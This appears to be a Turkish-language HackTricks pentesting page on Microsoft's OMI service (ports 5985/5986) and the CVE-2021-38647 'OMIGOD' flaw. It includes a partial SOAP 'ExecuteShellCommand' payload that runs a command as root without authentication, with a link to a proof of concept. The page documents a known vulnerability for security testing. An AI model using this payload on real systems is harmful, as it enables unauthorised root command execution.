# 5985,5986 - OMI Pentesting

<details>

<summary><strong>AWS hacklemeyi sıfırdan kahraman olmaya kadar öğrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Kırmızı Takım Uzmanı)</strong></a><strong>!</strong></summary>

* Bir **cybersecurity şirketinde** çalışıyor musunuz? **Şirketinizi HackTricks'te reklamını görmek** ister misiniz? veya **PEASS'ın en son sürümüne veya HackTricks'i PDF olarak indirmek** ister misiniz? [**ABONELİK PLANLARINI**](https://github.com/sponsors/carlospolop) kontrol edin!
* [**The PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family) keşfedin, özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonunu
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
* [**💬**](https://emojipedia.org/speech-balloon/) [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katılın** veya **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**'u takip edin**.
* **Hacking hilelerinizi [hacktricks repo](https://github.com/carlospolop/hacktricks) ve [hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)**'a PR göndererek paylaşın.

</details>

### **Temel Bilgiler**

**OMI**, Microsoft tarafından sunulan bir **[açık kaynak](https://github.com/microsoft/omi)** aracıdır ve uzaktan yapılandırma yönetimi için tasarlanmıştır. Özellikle Azure'da Linux sunucular için önemlidir ve şu hizmetleri kullanır:

- **Azure Automation**
- **Azure Otomatik Güncelleme**
- **Azure Operasyon Yönetimi Suite'i**
- **Azure Günlük Analitiği**
- **Azure Yapılandırma Yönetimi**
- **Azure Teşhisleri**

Bu hizmetler etkinleştirildiğinde, `omiengine` işlemi başlatılır ve tüm arayüzlerde root olarak dinler.

Kullanılan **varsayılan portlar** **5985** (http) ve **5986** (https)'dır.

### **[CVE-2021-38647 Zafiyeti](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-38647)**

16 Eylül'de gözlemlendiği gibi, Azure'da bu hizmetleri kullanan Linux sunucuları, zafiyete sahip bir OMI sürümü nedeniyle savunmasızdır. Bu zafiyet, OMI sunucusunun `/wsman` uç noktası üzerinden kimlik doğrulama başlığı gerektirmeden mesajları işlemesinde yatmaktadır ve istemciyi yanlış bir şekilde yetkilendirir.

Bir saldırgan, kimlik doğrulama başlığı olmadan "ExecuteShellCommand" SOAP yükünü göndererek sunucunun root ayrıcalıklarıyla komutları çalıştırmasını sağlayabilir.
```xml
<s:Envelope xmlns:s="http://www.w3.org/2003/05/soap-envelope" xmlns:a="http://schemas.xmlsoap.org/ws/2004/08/addressing"
...
<s:Body>
<p:ExecuteShellCommand_INPUT xmlns:p="http://schemas.dmtf.org/wbem/wscim/1/cim-schema/2/SCX_OperatingSystem">
<p:command>id</p:command>
<p:timeout>0</p:timeout>
</p:ExecuteShellCommand_INPUT>
</s:Body>
</s:Envelope>
```
Bu CVE hakkında daha fazla bilgi için **[buraya](https://github.com/horizon3ai/CVE-2021-38647)** bakın.

## Referanslar

* [https://www.horizon3.ai/omigod-rce-vulnerability-in-multiple-azure-linux-deployments/](https://www.horizon3.ai/omigod-rce-vulnerability-in-multiple-azure-linux-deployments/)
* [https://blog.wiz.io/omigod-critical-vulnerabilities-in-omi-azure/](https://blog.wiz.io/omigod-critical-vulnerabilities-in-omi-azure/)

<details>

<summary><strong>AWS hackleme konusunda sıfırdan kahraman olmak için</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>'ı öğrenin!</strong></summary>

* Bir **cybersecurity şirketinde** çalışıyor musunuz? **Şirketinizi HackTricks'te reklamınızı görmek** veya **PEASS'ın en son sürümüne erişmek veya HackTricks'i PDF olarak indirmek** ister misiniz? [**ABONELİK PLANLARINI**](https://github.com/sponsors/carlospolop) kontrol edin!
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) koleksiyonumuz olan özel [**NFT'lerimizi**](https://opensea.io/collection/the-peass-family) keşfedin.
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin.
* [**💬**](https://emojipedia.org/speech-balloon/) [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katılın** veya **Twitter**'da beni takip edin 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Hacking hilelerinizi [hacktricks repo](https://github.com/carlospolop/hacktricks) ve [hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)'ya PR göndererek paylaşın**.

</details>
